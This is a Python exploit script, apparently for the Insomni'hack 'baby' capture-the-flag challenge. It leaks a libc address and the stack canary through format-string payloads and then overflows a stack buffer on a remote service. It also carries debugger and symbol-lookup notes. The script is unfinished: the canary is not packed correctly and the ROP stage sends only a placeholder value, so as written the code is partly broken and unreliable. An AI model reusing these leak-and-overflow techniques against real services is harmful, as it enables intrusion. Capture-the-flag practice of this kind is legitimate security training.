#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''

Strategy:
==========
1. Leak a libc address from the stack and calculate the libc base address
2. Leak the stack cookie
3. Trigger the buffer overflow and get RIP control
4. Do some rop magic

Tricks:
========
Rename to libc.so.6 and:
LD_LIBRARY_PATH=. ./baby


1)  Cookie stored at the beginning of the function at [rbp - 8]
 
Cookie breakpoint               https://xorl.wordpress.com/2010/10/14/linux-glibc-stack-canary-values/
   0x7f379ee674d9 <dofmt+17>:   mov    rax,QWORD PTR fs:0x28         // copy canary pointer into RAX
=> 0x7f379ee674e2 <dofmt+26>:   mov    QWORD PTR [rbp-0x8],rax       // copy the canary content into RAX
   0x7f379ee674e6 <dofmt+30>:   xor    eax,eax                       // zero out the canary 

    [Switching to process 31162]
    [----------------------------------registers-----------------------------------]
    RAX: 0x83511eb77edda800 

2) Libc and system
> rabin2 -s libc.so.6 | grep system
vaddr=0x00137c20 paddr=0x00137c20 ord=225 fwd=NONE sz=70 bind=GLOBAL type=FUNC name=svcerr_systemerr
vaddr=0x00045390 paddr=0x00045390 ord=584 fwd=NONE sz=45 bind=GLOBAL type=FUNC name=__libc_system


br *dostack+155
set follow-fork-mode child
c



'''


from pwn import *
import socket  
import sys  
import struct  
import telnetlib


def perror():
    sys.exit("python {0} remote/local".format(sys.argv[0]))

try:
    arg1 = str(sys.argv[1])
except:
    perror()


PORT = 1337
if (arg1 == "remote"):
    HOST = "baby.teaser.insomnihack.ch"
elif (arg1 == "local"):
    HOST = "127.0.0.1"
else:
    perror()


def interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def readuntil(s, delim='\n'):
    x = ""
    while not x.endswith(delim):
        x += s.recv(1)
    return x


def pause():
    print "[*] Paused, press ENTER to continue."
    raw_input()


def connect():
    # Connect to target
    # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # s.connect((HOST, PORT))
    # print("[*] Connecting to {0}:{1}".format(HOST,PORT))
    # return s
    
    s = remote(HOST, PORT)
    return s


def dofmt(s):
    log.info("Exploiting dofmt()")
    
    choice="2"

    s.readuntil("> ")
    s.sendline(choice)
    s.readuntil("> ")
    s.sendline("%2$llx")      
    libc = s.readuntil("> ")
    log.info("Leaking libc at: %s" % libc)

    s.sendline(choice)
    s.readuntil("> ")
    s.sendline("%138$llx")
    cookie  = s.recv()
    log.info("Leaking stack cookie: %s" % cookie)

    s.sendline("")
    
    return cookie.strip()


def  dostack(s, cookie):
    log.info("Exploiting dostack()")
    system_off = 0x00045390

    choice = "1"
    buffsz = "1032"
    buff = "A"* (0x410 - 0x8)
    buff += (cookie + "BBBBCCCC" )
    s.sendline(choice)
    log.info("Sending choice {}".format(choice))
    x = s.readuntil("bytes you want to send ? ")
    #log.info(x)
    log.info("Sending buffsz {}".format(buffsz))
    s.sendline(buffsz) 
    log.info("Sending buff {}".format(buff))
    s.sendline(buff)     
    


def rop(s,cookie):  
    try:
        log.info("Building ROP chain")
        # Build payload
        payload =  ""
        payload += struct.pack("<I", 0x76EE012C)
        
        
        # Send payload
        s.send(payload)
        
        # Interact with the shell
        #interact()
    except socket.errno:
        raise


def main():
    s = connect() 
    cookie = dofmt(s)       
    #p64(int(cookie,16))
    dostack(s, cookie)

    rop(s,cookie)
    


if __name__ == '__main__':  
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)